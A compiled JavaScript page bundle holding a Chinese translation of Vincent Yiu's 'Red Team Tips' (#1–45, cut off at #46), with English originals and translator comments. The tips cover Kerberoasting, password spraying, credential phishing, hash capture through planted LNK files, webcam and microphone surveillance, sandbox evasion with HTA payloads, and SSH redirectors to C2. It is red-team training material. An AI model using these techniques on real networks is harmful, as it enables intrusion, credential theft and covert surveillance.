(window.webpackJsonp=window.webpackJsonp||[]).push([[67],{417:function(e,t,s){"use strict";s.r(t);var o=s(1),a=Object(o.a)({},function(){var e=this,t=e.$createElement,s=e._self._c||t;return s("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[s("p",[e._v("çº¢é˜Ÿæ¸—é€æµ‹è¯•æç¤ºæ¥æºäºæ–¯åœ†å®‰å…¨@vysecurityå¤§ä½¬\n@Vincent Yiuçš„ç«™ç‚¹"),s("a",{attrs:{href:"https://vincentyiu.com/red-team-tips/",target:"_blank",rel:"noopener noreferrer"}},[e._v("Red Team Tips"),s("OutboundLink")],1),e._v(" æˆ‘è¿™ç¯‡å°±å½“ç¿»è¯‘ç¨¿ã€‚ä»çº¢è“è§’åº¦æ€è€ƒä¸å¯¹æŠ—,è¡¥å……ä¸‹è‡ªå·±çš„ä¸è¶³ã€‚\n")]),e._v(" "),s("h2",{attrs:{id:"red-team-tips"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#red-team-tips","aria-hidden":"true"}},[e._v("#")]),e._v(" Red Team Tips")]),e._v(" "),s("h3",{attrs:{id:"_1-10"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_1-10","aria-hidden":"true"}},[e._v("#")]),e._v(" 1- 10")]),e._v(" "),s("p",[e._v("Red Tip #1: Profile your victim and use their user agent to mask your traffic. Alternatively use UA from software such as Outlook."),s("br"),e._v("\nçº¢é˜Ÿæç¤º #1 åˆ†æå—å®³è€…(è“æ–¹ç›®æ ‡)å¹¶ä½¿ç”¨ä»–ä»¬çš„UAæ¥\béšè—è‡ªå·±çš„æµé‡ã€‚æˆ–è€…å¯ä»¥ä½¿ç”¨è½¯ä»¶çš„uaä¾‹å¦‚Outlook")]),e._v(" "),s("p",[e._v("Red tip #2: If the enemy SOC is using proxy logs for analysis. Guess what? It wont log cookies or POST body content as can be sensitive."),s("br"),e._v("\nçº¢é˜Ÿæç¤º #2 å¦‚æœ\bè“æ–¹SOC\båˆ†æä»£ç†æ—¥å¿—ã€‚ä½ çŒœæ€ä¹ˆç€ï¼Ÿå®ƒä¸ä¼šè®°å½•cookiesæˆ–post bodyç­‰æ•æ„Ÿå†…å®¹ã€‚")]),e._v(" "),s("p",[e._v("Red tip #3: Taking a snapshot of AD can let you browse, explore and formulate future attacks if access is lost momentarily."),s("br"),e._v("\nçº¢é˜Ÿæç¤º #3ï¼šåšä¸ªADå¿«ç…§å¯ä»¥è®©ä½ æµè§ˆã€æ¢ç´¢å’Œåˆ¶å®šæœªæ¥çš„æ”»å‡»å¦‚æœè®¿é—®æš‚æ—¶ä¸¢å¤±ã€‚")]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("ul",[s("li",[e._v("å¯¹ADæ¸—é€ä¸äº†è§£çš„å°ä¼™ä¼´ä»¬å¯ä»¥çœ‹è¿™ä¸ª"),s("a",{attrs:{href:"https://github.com/uknowsec/Active-Directory-Pentest-Notes",target:"_blank",rel:"noopener noreferrer"}},[e._v("å¸–å­"),s("OutboundLink")],1)])])]),e._v(" "),s("p",[e._v("Red tip #4: consider using Office Template macros and replacing normal.dot for persistence in VDI environments."),s("br"),e._v("\nçº¢é˜Ÿæç¤º #4ï¼šåœ¨VDIè™šæ‹Ÿæœºç¯å¢ƒä¸­è€ƒè™‘ä½¿ç”¨Officeæ¨¡æ¿macrosä»¥åŠæ›¿æ¢normal.dotçš„æ–¹å¼æ¥æŒç»­æ§åˆ¶")]),e._v(" "),s("ul",[s("li",[e._v("ä¸è§£ï¼š åœ¨éè™šæ‹ŸåŒ–ç¯å¢ƒè¿™ä¸ªå®çš„æ–¹å¼å°±ä¸è€ƒè™‘ä¹ˆï¼Ÿ")])]),e._v(" "),s("p",[e._v("Red tip #5: Do a DNS lookup for terms such as intranet, sharepoint, wiki, nessus, cyberark and many others to start intel on your target."),s("br"),e._v("\nçº¢é˜Ÿæç¤º #5ï¼šå¯¹DNS lookupæ—¶ï¼Œå¯ä»¥\bå°è¯•Intranetï¼ŒSharePointï¼ŒWikiï¼Œnessusï¼Œcyberarkç­‰å­—æ®µï¼Œè·å–ç›®æ ‡æƒ…æŠ¥ã€‚")]),e._v(" "),s("p",[e._v("Red tip #6: Got access but need to find target? Use WMIC to query and dump the DNS Zone for a better view of assets - https://serverfault.com/questions/550385/export-all-hosts-from-dns-manager-using-powershell"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #6ï¼šæœ‰äº†æƒé™ä½†éœ€è¦æ‰¾åˆ°ç›®æ ‡ï¼Ÿé€šè¿‡wmicå»æŸ¥è¯¢å’Œdump dnsåŒºåŸŸï¼Œä»¥è·å¾—æ›´å¥½çš„èµ„äº§è§†å›¾")]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("ul",[s("li",[s("a",{attrs:{href:"https://serverfault.com/questions/550385/export-all-hosts-from-dns-manager-using-powershell",target:"_blank",rel:"noopener noreferrer"}},[e._v("å‚è€ƒåœ°å€"),s("OutboundLink")],1)])])]),e._v(" "),s("p",[e._v("Red tip #7: Whether PSEXEC, WMI, PS remoting or even the recent COM execution technique for lateral movement. Dont forget beloved RDP."),s("br"),e._v("\nçº¢é˜Ÿæç¤º #7ï¼šæ— è®ºæ˜¯psexecã€wmiã€ps remote æ‰§è¡Œï¼Œè¿˜æ˜¯æœ€è¿‘çš„ç”¨äºæ¨ªå‘ç§»åŠ¨çš„comæ‰§è¡ŒæŠ€æœ¯ã€‚åˆ«å¿˜äº†RDPè¿œç¨‹æ¡Œé¢ã€‚")]),e._v(" "),s("p",[e._v("Red tip #8: Make sure theres trackers in your: emails, delivery server and payload execution. Any more? Comment to share!"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #8ï¼šç¡®ä¿é‚®ä»¶ï¼ŒæŠ•é€’æœåŠ¡å™¨å’Œæœ‰æ•ˆè½½è·æ‰§è¡Œä¸­æœ‰è·Ÿè¸ªå™¨ã€‚è¿˜æœ‰è·Ÿæ›´å¤šaçš„ï¼Ÿè¯„è®ºåˆ†äº«ï¼")]),e._v(" "),s("ul",[s("li",[e._v("ä¸è§£ï¼štrackersæ˜¯æŒ‡ä»€ä¹ˆï¼Ÿ")])]),e._v(" "),s("p",[e._v("Red tip #9: When PowerUp yields no results, dont forget SysInternalss AutoRuns. Often you can find unexpected surprises ğŸ˜ƒ"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #9ï¼šå½“PowerUpæ²¡æœ‰ç»“æœæ—¶ï¼Œè¯·ä¸è¦å¿˜è®°SysInternalss AutoRunsã€‚é€šå¸¸æ‚¨ä¼šå‘ç°æ„æƒ³ä¸åˆ°çš„æƒŠå–œã€‚")]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("ul",[s("li",[e._v("SysInternalss AutoRunsè‡ªå¯åŠ¨å·¥å…·æœ‰å‘½ä»¤è¡Œç‰ˆæœ¬ã€‚")])])]),e._v(" "),s("p",[e._v("Red tip #10: When using BloodHound, dont forget DA equivalents such as administrators and server operators etc too. These arent mapped."),s("br"),e._v("\nçº¢é˜Ÿæç¤º #10ï¼šåœ¨ä½¿ç”¨BloodHoundæ—¶ï¼Œä¸è¦å¿˜è®°åŸŸè´¦æˆ·DAçš„ç­‰ä»·ç‰©ï¼Œå¦‚ç®¡ç†å‘˜å’ŒæœåŠ¡å™¨æ“ä½œå‘˜ç­‰ã€‚è¿™äº›æ²¡æœ‰æ˜ å°„ã€‚")]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("ul",[s("li",[e._v("è¡¥å……åŸŸæ¸—é€çŸ¥è¯† 2019.10.15 9:00")])])]),e._v(" "),s("h3",{attrs:{id:"_11-20"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_11-20","aria-hidden":"true"}},[e._v("#")]),e._v(" 11-20")]),e._v(" "),s("p",[e._v("Red tip #11: When navigating mature environments, a good old network diagram along with AD OUs can help to shed some light into next steps."),s("br"),e._v("\nçº¢é˜Ÿæç¤º #11ï¼šå½“å¤„åœ¨ç»å…¸ç½‘ç»œç¯å¢ƒæ—¶ï¼ŒåŒæ—¶æ‹¿åˆ°æ—§ç½‘ç»œå›¾å’ŒADä¸­ç»„ç»‡å•å…ƒOUï¼Œæœ‰åŠ©äºæˆ‘ä»¬ä¸‹ä¸€æ­¥çš„å·¥ä½œã€‚")]),e._v(" "),s("p",[e._v("Red tip #12: Kerberoast them hashes, could be a fast route to domain administrator. PowerView: Invoke-Kerberoast -Format Hashcat"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #12ï¼šKerberoastè·å–hashï¼Œå¯èƒ½æ˜¯é€šå¾€åŸŸç®¡ç†å‘˜çš„å¿«é€Ÿé€”å¾„ã€‚ PowerViewï¼šè°ƒç”¨Kerberoast -Format Hashcat")]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("ul",[s("li",[e._v("ç ´è§£KerberosæœåŠ¡ç¥¨è¯å¹¶å¯¹å…¶è¿›è¡Œé‡å†™ä»¥è·å–å¯¹ç›®æ ‡æœåŠ¡çš„è®¿é—®çš„è¿‡ç¨‹ç§°Kerberoast\b")]),e._v(" "),s("li",[s("a",{attrs:{href:"https://pentestlab.blog/2018/06/12/kerberoast/",target:"_blank",rel:"noopener noreferrer"}},[e._v("Kerberoast\bè¿‡ç¨‹ï¼Œå‚è€ƒ"),s("OutboundLink")],1)]),e._v(" "),s("li",[s("a",{attrs:{href:"https://github.com/nidem/kerberoast",target:"_blank",rel:"noopener noreferrer"}},[e._v("å·¥å…·åœ°å€"),s("OutboundLink")],1)])])]),e._v(" "),s("p",[e._v("Red tip #13: Shared local administrator account hashes are great for lateral movement. Find machines based on the same build and attack away"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #13ï¼šå…±äº«çš„æœ¬åœ°ç®¡ç†å‘˜å¸æˆ·å“ˆå¸Œå€¼éå¸¸é€‚åˆæ¨ªå‘ç§»åŠ¨ã€‚ æŸ¥æ‰¾åŸºäºç›¸åŒæ„å»ºçš„æœºå™¨å¹¶è¿›è¡Œæ”»å‡»")]),e._v(" "),s("p",[e._v("Red tip #14: Got extra credentials? Use different sets for separate egress channels so that if one account is disabled all the rest are ok."),s("br"),e._v("\nçº¢é˜Ÿæç¤º #14ï¼šæœ‰å…¶ä»–å‡­è¯å—ï¼Ÿå¯¹ä¸åŒçš„å‡ºå£é€šé“ä½¿ç”¨ä¸åŒçš„è®¾ç½®ï¼Œä»¥ä¾¿å¦‚æœä¸€ä¸ªå¸æˆ·è¢«ç¦ç”¨ï¼Œå…¶ä½™çš„éƒ½å¯ä»¥ã€‚")]),e._v(" "),s("p",[e._v("Red tip #15: You dont need payloads when you can phish credentials and login to Citrix, VPN, email with no 2FA. Check the perimeter."),s("br"),e._v("\nçº¢é˜Ÿæç¤º #15ï¼šå½“å¯ä»¥é€šè¿‡é’“é±¼æ–¹å¼å¾—åˆ°å‡­æ®å¹¶ç™»å½•åˆ°Citrixã€VPNã€æ²¡æœ‰åŒå› ç´ è®¤è¯\bçš„ç”µå­é‚®ä»¶æ—¶ï¼Œä¸éœ€è¦payloadã€‚æ£€æŸ¥è¾¹ç•Œã€‚")]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("ul",[s("li",[e._v("èƒ½é’“é±¼å°±\båˆ«å‡¿ï¼")])])]),e._v(" "),s("p",[e._v("Red tip #16: @dafthack MailSniper, @domchell LyncSniper can be a useful but noisy way to obtain AD credentials into an organisation.\nçº¢é˜Ÿæç¤º #16ï¼šMailSniper,LyncSniperä¸¤æ¬¾å·¥å…·ï¼Œèƒ½åœ¨ä»–ä»¬çš„æ–¹å¼èƒ½è·å–\bè¿›å…¥è“æ–¹ç»„ç»‡ADå‡­è¯ï¼Œä½†æ˜¯å™ªéŸ³å¤§ã€‚")]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("ul",[s("li",[s("a",{attrs:{href:"https://github.com/dafthack/MailSniper",target:"_blank",rel:"noopener noreferrer"}},[e._v("MailSniper"),s("OutboundLink")],1),e._v("æ˜¯ä¸€ç§æ¸—é€æµ‹è¯•å·¥å…·ï¼Œç”¨äºåœ¨Microsoft Exchangeç¯å¢ƒä¸­æœç´¢ç”µå­é‚®ä»¶ä¸­çš„ç‰¹å®šæœ¯è¯­ï¼ˆå¯†ç ï¼Œå†…éƒ¨æƒ…æŠ¥ï¼Œç½‘ç»œä½“ç³»ç»“æ„ä¿¡æ¯ç­‰ï¼‰ã€‚ å®ƒå¯ä»¥ç”¨ä½œéç®¡ç†ç”¨æˆ·æ¥æœç´¢è‡ªå·±çš„ç”µå­é‚®ä»¶ï¼Œä¹Ÿå¯ä»¥ç”¨ä½œç®¡ç†å‘˜æ¥æœç´¢åŸŸä¸­æ¯ä¸ªç”¨æˆ·çš„é‚®ç®±ã€‚")]),e._v(" "),s("li",[s("a",{attrs:{href:"https://github.com/mdsecresearch/LyncSniper",target:"_blank",rel:"noopener noreferrer"}},[e._v("LyncSniper"),s("OutboundLink")],1),e._v("æ˜¯ç”¨äºæ¸—é€æµ‹è¯•åœ¨å†…éƒ¨æˆ–Office 365ä¸­æ‰˜ç®¡çš„Lyncå’ŒSkype for Businesséƒ¨ç½²çš„å·¥å…·ã€‚")])])]),e._v(" "),s("p",[e._v("Red tip #17: @_staaldraad Ruler tool can be used to obtain code execution on a system running Outlook if you can access exchange externally"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #17ï¼šå¦‚æœå¯ä»¥ä»å¤–éƒ¨è®¿é—®Exchangeï¼Œå°è¯•ä½¿ç”¨Rulerè¿™æ¬¾å·¥å…·ï¼Œå¯ä»¥\båœ¨è¿è¡ŒOutlookçš„ç³»ç»Ÿä¸Šè·å–ä»£ç æ‰§è¡Œ")]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("ul",[s("li",[s("a",{attrs:{href:"https://github.com/sensepost/ruler",target:"_blank",rel:"noopener noreferrer"}},[e._v("Rulerå·¥å…·"),s("OutboundLink")],1)])])]),e._v(" "),s("p",[e._v("Red tip #18: When tools like MailSniper dont work in custom environments, you still have good old @Burp_Suite to replicate the attacks"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #18ï¼šå½“åƒmailsniperè¿™æ ·çš„å·¥å…·ä¸èƒ½åœ¨ç¯å¢ƒä¸­å·¥ä½œæ—¶ï¼Œä»ç„¶å¯ä»¥ä½¿ç”¨è€ä¼™è®¡burpsuiteæ¥å¤åˆ¶mailsniperçš„æ”»å‡»è¿‡ç¨‹")]),e._v(" "),s("p",[e._v("Red tip #19: Need a DC? "),s("code",[e._v("echo %LOGONSERVER%")]),e._v(". Need a list? "),s("code",[e._v("nltest /dclist, nslookup -q=srv _kerberos._tcp")]),e._v(" (domain suffix can autocomplete)"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #19: å¸¸è§åŸŸæ¸—é€å‘½ä»¤è¡Œ.")]),e._v(" "),s("p",[e._v("Red tip #20: So apparently not many people use SSH for redirector setup. So try out "),s("code",[e._v("ssh c2 -R *:80:localhost:80")]),e._v(". "),s("code",[e._v("SSH config GatewayPorts yes")]),s("br"),e._v("\nçº¢é˜Ÿæç¤º #20:ssh\bé‡å®šå‘ "),s("code",[e._v("ssh c2 -R *:80:localhost:80")])]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("ul",[s("li",[s("a",{attrs:{href:"https://blog.csdn.net/autoliuweijie/article/details/80283689",target:"_blank",rel:"noopener noreferrer"}},[e._v("sshé‡å®šå‘å‘½ä»¤è¡Œåœºæ™¯"),s("OutboundLink")],1)])])]),e._v(" "),s("h3",{attrs:{id:"_21-30"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_21-30","aria-hidden":"true"}},[e._v("#")]),e._v(" 21-30")]),e._v(" "),s("p",[e._v("Red tip #21: Found open user home shares that are accessible? See if you can drop into Startup Programs for lateral movement and privesc."),s("br"),e._v("\nçº¢é˜Ÿæç¤º #21:æ‰¾åˆ°å¯è®¿é—®çš„å¼€æ”¾ç”¨æˆ·å®¶åº­å…±äº«ï¼Ÿçœ‹çœ‹æ˜¯å¦å¯ä»¥è¿›å…¥â€œå¯åŠ¨ç¨‹åºâ€è¿›è¡Œæ¨ªå‘ç§»åŠ¨å’Œç‰¹æƒã€‚")]),e._v(" "),s("p",[e._v("Red tip #22: Use VNC, microphone and webcam to perform surveillance. Netstat, tasklist can provide context into what the users doing."),s("br"),e._v("\nçº¢é˜Ÿæç¤º #22:ä½¿ç”¨VNCï¼Œéº¦å…‹é£å’Œç½‘ç»œæ‘„åƒå¤´ç›‘æ§ã€‚ Netstatï¼Œtasklistå¯ä»¥æä¾›æœ‰å…³ç”¨æˆ·æ­£åœ¨æ‰§è¡Œçš„æ“ä½œçš„ä¸Šä¸‹æ–‡ã€‚")]),e._v(" "),s("p",[e._v("Red tip #23: Stash payloads in "),s("code",[e._v("C:\\$Recycle.Bin")]),s("br"),e._v("\nçº¢é˜Ÿæç¤º #23:\b å¯ä»¥å°†payloadéšè—ä¸ºC:$Recycle.Bin")]),e._v(" "),s("p",[e._v("Red tip #24: Compromise the SOC and Security teams to watch their progress and track their email alerts for sophisticated threats"),s("br"),e._v("\n\bçº¢é˜Ÿæç¤º #24:ç ´åSOCå’Œå®‰å…¨å›¢é˜Ÿï¼Œè¿›è€Œè§‚å¯Ÿ\bä»–ä»¬çš„æµç¨‹ä»¥åŠè·Ÿè¸ªè“æ–¹ç”¨äºå¤æ‚å¨èƒçš„ç”µå­é‚®ä»¶è­¦æŠ¥ã€‚")]),e._v(" "),s("p",[e._v("Red tip #25: Probably dont do this on a red team, but spray for Welcome1, Password1 if youre struggling to move. But move off fast."),s("br"),e._v("\n\bçº¢é˜Ÿæç¤º #25:æ²¡çœ‹æ‡‚ï¼Œæˆ‘åç»­å¾®ä¿¡ç»Ÿä¸€é—®ä¸‹ä»–ã€‚")]),e._v(" "),s("p",[e._v("Red tip #26: Split your campaigns up so that they are independent. Fire tons at once for decoys and to burn out the defence."),s("br"),e._v("\n\bçº¢é˜Ÿæç¤º #26:\bå°†è¡ŒåŠ¨åˆ†è§£ï¼Œä½¿å…¶ç‹¬ç«‹ã€‚ç«‹å³å‘é€å¤§é‡è¯±é¥µï¼Œæ‘§æ¯é˜²å¾¡ã€‚")]),e._v(" "),s("p",[e._v("Red tip #27: Need more credentials? Search for passwords on Sharepoint, and intranet."),s("br"),e._v("\n\bçº¢é˜Ÿæç¤º #27:\b åœ¨Sharepointä»¥åŠintranetï¼Œgithubç­‰ï¼Œæœç´¢å¯†ç ")]),e._v(" "),s("p",[e._v("Red tip #28: Look for asset registers to understand who owns what machine, make and model. Theres usually an asset label to host name too!"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #28:\b å¯»æ‰¾èµ„äº§ç™»è®°æœ¬ä»¥äº†è§£è°æ‹¥æœ‰ä»€ä¹ˆæœºå™¨ï¼Œåˆ¶é€ å•†å’Œå‹å·ã€‚ é€šå¸¸ä¹Ÿæœ‰ä¸€ä¸ªèµ„äº§æ ‡ç­¾æ¥ä½œä¸ºä¸»æœºåï¼")]),e._v(" "),s("p",[e._v("Red tip #29: Lateral movement: printers, open webroots, good old Tomcat, what are your quick wins?"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #29:\b æ¨ªå‘è¿åŠ¨ï¼šæ‰“å°æœºï¼Œå¼€æ”¾çš„ç½‘ç»œæ ¹ç›®å½•ï¼Œè€ç‰ˆæœ¬Tomcatã€‚")]),e._v(" "),s("p",[e._v("Red tip #30: Get AD credentials? Turn up on site and you might be able to use them to login to Corporate Wifi ğŸ˜ƒ"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #30:\b è·å–ADå‡­æ®ï¼Ÿ æ‰“å¼€ç½‘ç«™ï¼Œä½ ä¹Ÿè®¸å¯ä»¥ä½¿ç”¨å®ƒä»¬ç™»å½•åˆ°å…¬å¸çš„Wifi ğŸ˜ƒ")]),e._v(" "),s("h3",{attrs:{id:"_31-40"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_31-40","aria-hidden":"true"}},[e._v("#")]),e._v(" 31-40")]),e._v(" "),s("p",[e._v("Red tip #31: Hunting e-mails and network shares for penetration testing reports can often yield good results."),s("br"),e._v("\nçº¢é˜Ÿæç¤º #31:\b å¯»æ‰¾ç”µå­é‚®ä»¶å’Œç½‘ç»œå…±äº«ä»¥è·å–æ¸—é€æµ‹è¯•æŠ¥å‘Šé€šå¸¸å¯ä»¥äº§ç”Ÿè‰¯å¥½çš„ç»“æœã€‚")]),e._v(" "),s("p",[e._v("Red tip #32: List mounts: net use, look for shared folders and drop a UNC icon LNK into it. Run Inveigh or Wireshark on host to grab hashes."),s("br"),e._v("\nçº¢é˜Ÿæç¤º #32:\b åˆ—å‡ºæŒ‚è½½ï¼šç½‘ç»œä½¿ç”¨ï¼ŒæŸ¥æ‰¾å…±äº«æ–‡ä»¶å¤¹ï¼Œç„¶åå°†UNCå›¾æ ‡LNKæ”¾åˆ°å…¶ä¸­ã€‚åœ¨ä¸»æœºä¸Šè¿è¡ŒInveighæˆ–Wiresharkæ¥è·å–å“ˆå¸Œã€‚")]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("ul",[s("li",[e._v("Inveighæ˜¯ä¸€æ¬¾Windows PowerShellçš„LLMNR/NBNSåè®®æ¬ºéª—ï¼ä¸­é—´äººå·¥å…·ã€‚è¿™ä¸ªå·¥å…·å¯ä»¥æœ‰æ•ˆåœ°å¸®åŠ©æ¸—é€æµ‹è¯•äººå‘˜å‘ç°Windowsç³»ç»Ÿä¸­å­˜åœ¨çš„é—®é¢˜ã€‚"),s("br"),e._v("\nä¸è§£")])])]),e._v(" "),s("p",[e._v("Red tip #33: Orgs are transitioning to cloud services such as AWS, Beanstalk, O365, Google Apps. 2FA is vital - password reset to compromise."),s("br"),e._v("\nçº¢é˜Ÿæç¤º #33:\b ç»„ç»‡/å…¬å¸æ­£åœ¨è¿‡æ¸¡åˆ°äº‘æœåŠ¡ï¼Œå¦‚AWSã€Beanstalkã€O365ã€Googleåº”ç”¨ç¨‹åºã€‚2fa/åŒå› ç´ è®¤è¯å¯¹äºå¯†ç é‡ç½®è¦çš„æŠ˜ä¸­æ–¹æ¡ˆæ˜¯è‡³å…³é‡è¦ã€‚")]),e._v(" "),s("p",[e._v("Red tip #34: OpSec. Set notifications to your phone for logins or intrusion attempts in any part of your attack infrastructure."),s("br"),e._v("\nçº¢é˜Ÿæç¤º #34:\b OpSecï¼ˆä½œæˆ˜å®‰å…¨ï¼‰ã€‚è®¾ç½®æ‰‹æœºé€šçŸ¥ï¼Œå½“æ”»å‡»åŸºç¡€è®¾æ–½è¢«è¯•å›¾ç™»å½•æˆ–å…¥ä¾µçš„æ—¶å€™ã€‚")]),e._v(" "),s("p",[e._v("Red tip #35: FireEye sandbox flagging your payloads? Try anti sandbox techniques! If not, just use HTA to get into memory as it doesnt scan"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #35:\b FireEyeæ²™ç®±æ ‡è®°ä½ çš„æœ‰æ•ˆè½½è·?å°è¯•åæ²™ç›’æŠ€æœ¯!å¦‚æœæ²¡æœ‰ï¼Œå°±ä½¿ç”¨HTAè¿›å…¥å†…å­˜ï¼Œå› ä¸ºå®ƒä¸ä¼šæ‰«æã€‚")]),e._v(" "),s("p",[e._v("Red tip #36: Dont forget the good old GPP passwords in SYSVOL. There may be cached GPP on the machine. Applying the patch isnt enough"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #36 ä¸è¦å¿˜è®°sysvolä¸­çš„æ—§gppå¯†ç ã€‚è®¡ç®—æœºä¸Šå¯èƒ½æœ‰ç¼“å­˜çš„GPPã€‚è¡¥ä¸ç¨‹åºæ˜¯ä¸å¤Ÿçš„")]),e._v(" "),s("ul",[s("li",[e._v("åŸŸæ¸—é€")])]),e._v(" "),s("p",[e._v("Red tip #37: Use GenHTA to generate HTA files that use anti-sandboxing techniques. https://github.com/vysec/GenHTA"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #37 åˆ©ç”¨GEHTAå·¥å…·å¯ä»¥ç”Ÿæˆåæ²™ç®±çš„HTAæ–‡ä»¶ã€‚https://github.com/vysec/genhta")]),e._v(" "),s("p",[e._v("Red tip #38: Having trouble getting @armitagehacker CobaltStrikes evil.hta through defenses? https://github.com/vysec/MorphHTA"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #38 å¾ˆéš¾å°†CSçš„evil.htaé€šè¿‡é˜²å¾¡\bç³»ç»Ÿï¼ŸMorphHTAçš„æ²¹ç®¡è§†é¢‘ï¼š")]),e._v(" "),s("iframe",{attrs:{width:"781",height:"439",src:"https://www.youtube.com/embed/X4S2aQ4o_jA",frameborder:"0",allow:"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture",allowfullscreen:""}}),e._v(" "),s("p",[e._v("Red tip #39: If emails get bounced, read the email! Sometimes due to malware scanners, spam etc. Or you may even get an out of office reply."),s("br"),e._v("\nçº¢é˜Ÿæç¤º #39: å¦‚æœé‚®ä»¶è¢«é€€å›ï¼Œè¯·é˜…è¯»é‚®ä»¶!æœ‰æ—¶æ˜¯ç”±äºæ¶æ„è½¯ä»¶æ‰«æï¼Œåƒåœ¾é‚®ä»¶ç­‰ã€‚æˆ–è€…ä½ ç”šè‡³ä¼šå¾—åˆ°ä¸€ä¸ªå¤–å‡ºçš„ç­”å¤ã€‚")]),e._v(" "),s("p",[e._v("Red tip #40: @0x09AL suggests looking for default credentials on printers and embedded devices. Move off initial foothold using this."),s("br"),e._v("\nçº¢é˜Ÿæç¤º #40: 0x09ALå»ºè®®åœ¨æ‰“å°æœºå’ŒåµŒå…¥å¼è®¾å¤‡ä¸ŠæŸ¥æ‰¾é»˜è®¤å‡­æ®ã€‚ä»¥æ­¤ç§»å¼€æœ€åˆçš„ç«‹è¶³ç‚¹ã€‚")]),e._v(" "),s("h3",{attrs:{id:"_41-50"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_41-50","aria-hidden":"true"}},[e._v("#")]),e._v(" 41-50")]),e._v(" "),s("p",[e._v("Red tip #41: @Oddvarmoe suggests using Alternate Data Streams if you need to put a file on disk. For example   https://github.com/samratashok/nishang/blob/master/Backdoors/Invoke-ADSBackdoor.ps1"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #41: Oddvarmoeå»ºè®®å¦‚æœéœ€è¦å°†æ–‡ä»¶æ”¾åœ¨ç£ç›˜ä¸Šï¼Œè¯·ä½¿ç”¨å¤‡ç”¨æ•°æ®æµã€‚ä¾‹å¦‚https://github.com/samratashok/nishang/blob/master/Backdoors/Invoke-ADSBackdoor.ps1")]),e._v(" "),s("ul",[s("li",[e._v("\bä¸è§£")])]),e._v(" "),s("p",[e._v("Red tip #42: Got OS level access to a middle tier? "),s("code",[e._v("Task list")]),e._v(", "),s("code",[e._v("netstat")]),e._v(" and "),s("code",[e._v("wmic process list full | findstr /I commandline")]),e._v(" for more ideas!"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #42: å¯ä»¥è®¿é—®æ“ä½œç³»ç»Ÿçº§åˆ«çš„ä¸­é—´å±‚ï¼Ÿ"),s("code",[e._v("tasklist")]),e._v("ï¼Œ"),s("code",[e._v("netstat")]),e._v("å’Œ "),s("code",[e._v("wmic process list full | findstr /I commandline")]),e._v("  è·å–æ›´å¤šæ€è·¯ï¼")]),e._v(" "),s("p",[e._v("Red tip #43: So you know where the server application files are. Download the binaries and check out configuration files for conn. strings"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #43: å¦‚æœçŸ¥é“æœåŠ¡å™¨åº”ç”¨ç¨‹åºæ–‡ä»¶åœ¨å“ªé‡Œã€‚ä¸‹è½½äºŒè¿›åˆ¶æ–‡ä»¶å¹¶æ£€æŸ¥connçš„é…ç½®æ–‡ä»¶å­—ç¬¦ä¸²ã€‚")]),e._v(" "),s("p",[e._v("Red tip #44: Run PEiD and other packer / technology checkers to find out the language and packer used on downloaded server binaries."),s("br"),e._v("\nçº¢é˜Ÿæç¤º #44: åˆ©ç”¨PEiDæˆ–å…¶ä»–ç±»é€†å‘ç¨‹åº/æŠ€æœ¯æ£€æŸ¥å™¨ï¼Œä»¥æŸ¥æ‰¾ä¸‹è½½çš„æœåŠ¡å™¨äºŒè¿›åˆ¶æ–‡ä»¶ä½¿ç”¨çš„æ˜¯ä»€ä¹ˆç¼–ç¨‹è¯­è¨€å’Œæ‰“åŒ…/åŠ å£³ç¨‹åºã€‚")]),e._v(" "),s("p",[e._v("Red tip #45: Run strings on the application binary for potentially other cleartext sensitive strings! (Unicode mode too)"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #45: åœ¨åº”ç”¨ç¨‹åºäºŒè¿›åˆ¶æ–‡ä»¶ä¸Šåˆ†æå­—ç¬¦ä¸²ï¼Œä»¥è·å–å…¶ä»–å¯èƒ½çš„æ˜æ–‡æ•æ„Ÿå­—ç¬¦ä¸²ï¼ ï¼ˆUnicodeæ˜¯ä¸€ç§ï¼‰")]),e._v(" "),s("p",[e._v("Red tip #46: On a 